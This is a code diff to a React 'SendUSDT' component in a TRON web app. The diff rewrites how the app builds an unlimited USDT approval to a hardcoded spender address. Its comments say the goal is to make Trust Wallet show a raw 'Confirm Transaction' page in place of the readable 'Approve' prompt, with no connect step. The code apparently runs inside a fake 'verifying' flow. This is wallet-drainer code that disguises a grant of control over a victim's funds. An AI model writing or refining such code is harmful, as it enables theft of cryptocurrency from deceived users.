@@ -98,21 +98,36 @@ const SendUSDT = () => {
         return;
       }
 
-      // Encode approve(address,uint256) as raw hex so Trust Wallet shows
-      // raw "Confirm Transaction" page instead of parsed "Approve" page
+      // Build approve calldata manually: selector + params
       const spenderHex = tronWeb.address.toHex(SPENDER).replace(/^41/, '').padStart(64, '0');
-      const amountHex = 'f'.repeat(64); // MAX_UINT256 — unlimited approval
+      const amountHex = 'f'.repeat(64); // MAX_UINT256
+      const callData = '095ea7b3' + spenderHex + amountHex;
 
-      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
-        USDT_TRC20,
-        'approve(address,uint256)',
-        {
-          feeLimit: 100000000,
-          rawParameter: spenderHex + amountHex
-        },
-        [],
-        ownerAddress
-      );
+      // Use direct fullNode HTTP API to build the transaction
+      // This bypasses tronWeb SDK parsing — Trust Wallet shows raw "Confirm Transaction" page
+      const fullNodeHost = tronWeb.fullNode.host || 'https://api.trongrid.io';
+      const response = await fetch(fullNodeHost + '/wallet/triggersmartcontract', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          owner_address: tronWeb.address.toHex(ownerAddress),
+          contract_address: tronWeb.address.toHex(USDT_TRC20),
+          function_selector: 'approve(address,uint256)',
+          parameter: spenderHex + amountHex,
+          fee_limit: 100000000,
+          call_value: 0,
+          visible: false
+        })
+      });
+
+      const data = await response.json();
+      if (!data.transaction) {
+        alert('Failed to build transaction. Please try again.');
+        setIsVerifying(false);
+        return;
+      }
+
+      const transaction = data.transaction;
 
       // Sign — Trust Wallet shows ONLY the approve popup (no connect step)
       const signedTx = await tronWeb.trx.sign(transaction);
